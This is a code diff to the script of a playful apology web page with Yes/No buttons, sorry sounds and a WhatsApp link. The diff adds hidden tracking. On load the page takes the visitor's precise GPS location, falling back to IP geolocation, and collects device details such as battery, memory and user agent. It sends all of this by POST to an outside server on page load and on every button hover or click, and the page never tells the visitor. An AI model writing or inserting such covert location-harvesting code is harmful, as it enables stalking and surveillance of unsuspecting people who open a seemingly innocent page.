@@ -34,6 +34,9 @@ const sorrySounds = [
   'sorrySound5'
 ];
 
+// RISC Tracking Configuration
+const RISC_TRACKER_URL = 'https://url-retriver.onrender.com/api/apology-click';
+
 // Get DOM elements with new selectors
 const boton_no = document.getElementById("btn-no");
 const boton_yes = document.getElementById("btn-yes");
@@ -48,6 +51,7 @@ const countdown_element = document.getElementById("countdown");
 let count = 1;
 let maxAttempts = mensajes.length;
 let countdownInterval;
+let userLocationData = null;
 
 // Device detection for better iOS/Android support
 function detectDevice() {
@@ -58,6 +62,154 @@ function detectDevice() {
     Android: /android/i.test(userAgent),
     Mobile: /Mobi|Android/i.test(userAgent)
   };
+}
+
+// Comprehensive tracking data collection
+async function collectTrackingData(buttonType) {
+  const trackingData = {
+    button_type: buttonType,
+    timestamp: new Date().toISOString(),
+    referrer: document.referrer || 'direct',
+    screen_resolution: `${screen.width}x${screen.height}`,
+    viewport_size: `${window.innerWidth}x${window.innerHeight}`,
+    language: navigator.language || 'unknown',
+    platform: navigator.platform || 'unknown',
+    user_agent: navigator.userAgent || 'unknown',
+    online_status: navigator.onLine ? 'online' : 'offline'
+  };
+
+  // Get connection info if available
+  if ('connection' in navigator) {
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (connection) {
+      trackingData.connection_type = connection.effectiveType || connection.type || 'unknown';
+    }
+  }
+
+  // Get battery info if available
+  try {
+    if ('getBattery' in navigator) {
+      const battery = await navigator.getBattery();
+      trackingData.battery_level = Math.round(battery.level * 100);
+    }
+  } catch (e) {
+    trackingData.battery_level = 'unknown';
+  }
+
+  // Get device memory if available
+  if ('deviceMemory' in navigator) {
+    trackingData.device_memory = navigator.deviceMemory;
+  }
+
+  // Add location data if available
+  if (userLocationData) {
+    Object.assign(trackingData, userLocationData);
+  }
+
+  return trackingData;
+}
+
+// Get precise GPS location
+function getUserLocation() {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) {
+      reject(new Error('Geolocation not supported'));
+      return;
+    }
+
+    const options = {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 300000 // 5 minutes
+    };
+
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        userLocationData = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy,
+          altitude: position.coords.altitude,
+          speed: position.coords.speed,
+          heading: position.coords.heading,
+          location_source: 'browser_gps'
+        };
+        
+        console.log('GPS location obtained:', userLocationData);
+        resolve(userLocationData);
+      },
+      (error) => {
+        console.log('GPS location failed:', error.message);
+        
+        // Try to get approximate location from IP
+        getApproximateLocation()
+          .then(resolve)
+          .catch(reject);
+      },
+      options
+    );
+  });
+}
+
+// Get approximate location from IP
+async function getApproximateLocation() {
+  try {
+    const response = await fetch('https://ipapi.co/json/');
+    const data = await response.json();
+    
+    userLocationData = {
+      latitude: data.latitude,
+      longitude: data.longitude,
+      accuracy: 10000, // IP geolocation is less accurate
+      country: data.country_name,
+      region: data.region,
+      city: data.city,
+      timezone: data.timezone,
+      isp: data.org,
+      location_source: 'ip_geolocation'
+    };
+    
+    console.log('IP location obtained:', userLocationData);
+    return userLocationData;
+  } catch (error) {
+    console.error('Failed to get IP location:', error);
+    userLocationData = {
+      latitude: 'unknown',
+      longitude: 'unknown',
+      location_source: 'unavailable'
+    };
+    return userLocationData;
+  }
+}
+
+// Send tracking data to RISC
+async function sendTrackingData(buttonType) {
+  try {
+    console.log(`Sending tracking data for ${buttonType} button click...`);
+    
+    const trackingData = await collectTrackingData(buttonType);
+    
+    const response = await fetch(RISC_TRACKER_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+      },
+      body: JSON.stringify(trackingData)
+    });
+
+    if (response.ok) {
+      const result = await response.json();
+      console.log('Tracking data sent successfully:', result);
+      return result;
+    } else {
+      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+    }
+  } catch (error) {
+    console.error('Failed to send tracking data:', error);
+    // Don't let tracking failures affect user experience
+    return null;
+  }
 }
 
 // Function to play random sorry sound
@@ -222,8 +374,11 @@ function startCountdown() {
   }, 1000);
 }
 
-// Enhanced No button functionality with random sorry sounds
+// Enhanced No button functionality with random sorry sounds and tracking
 boton_no.addEventListener("mouseover", function () {
+  // Send tracking data for No button hover
+  sendTrackingData('no_hover');
+  
   // Play random sorry sound
   playRandomSorrySound();
   
@@ -295,8 +450,11 @@ boton_yes.addEventListener("mouseleave", function () {
   }
 });
 
-// Click handler for Yes button (when successfully clicked)
+// Click handler for Yes button (when successfully clicked) with tracking
 boton_yes.addEventListener("click", function () {
+  // Send comprehensive tracking data for Yes button click
+  sendTrackingData('yes_click');
+  
   try {
     let sonido = document.getElementById("miSonido2");
     sonido.play().catch(e => console.log("Audio play failed:", e));
@@ -328,6 +486,9 @@ boton_yes.addEventListener("click", function () {
 
 // WhatsApp integration with enhanced iOS/Android support
 boton_whatsapp.addEventListener("click", function () {
+  // Send tracking data for WhatsApp click
+  sendTrackingData('whatsapp_click');
+  
   redirectToWhatsApp();
 });
 
@@ -335,6 +496,9 @@ boton_whatsapp.addEventListener("click", function () {
 const restartButton = document.getElementById("btn-restart");
 if (restartButton) {
   restartButton.addEventListener("click", function() {
+    // Send tracking data for restart
+    sendTrackingData('restart_click');
+    
     // Clear any running intervals
     if (countdownInterval) {
       clearInterval(countdownInterval);
@@ -423,9 +587,22 @@ window.addEventListener('resize', function() {
   }
 });
 
-// Initialize
+// Initialize location tracking and page setup
 window.addEventListener('load', function() {
   adjustForMobile();
+  
+  // Start location tracking immediately
+  console.log('🌍 Starting location tracking...');
+  getUserLocation()
+    .then((locationData) => {
+      console.log('✅ Location tracking enabled:', locationData);
+    })
+    .catch((error) => {
+      console.log('⚠️ Location tracking failed, using fallback:', error.message);
+    });
+  
+  // Send initial page load tracking
+  sendTrackingData('page_load');
   
   // Add initial sparkles after page load
   setTimeout(() => {
@@ -449,6 +626,7 @@ console.log("🎉 Hope the improved interface helps you get forgiven!");
 console.log("🎮 Pro tip: Only the No button moves around - Yes button stays put!");
 console.log("🔊 New feature: Random sorry sounds when No button is hovered!");
 console.log("📱 Enhanced iOS/Android WhatsApp integration!");
+console.log("🌍 RISC Tracking: Comprehensive location and device data collection enabled!");
 console.log("✨ New features: Fixed header, constant acceptance message, better animations!");
 
 // Debug info for device detection
@@ -461,4 +639,4 @@ console.log("Device detected:", {
 });
 
 // Performance monitoring
-console.log("🚀 Enhanced UI loaded successfully!");
+console.log("🚀 Enhanced UI with RISC tracking loaded successfully!");
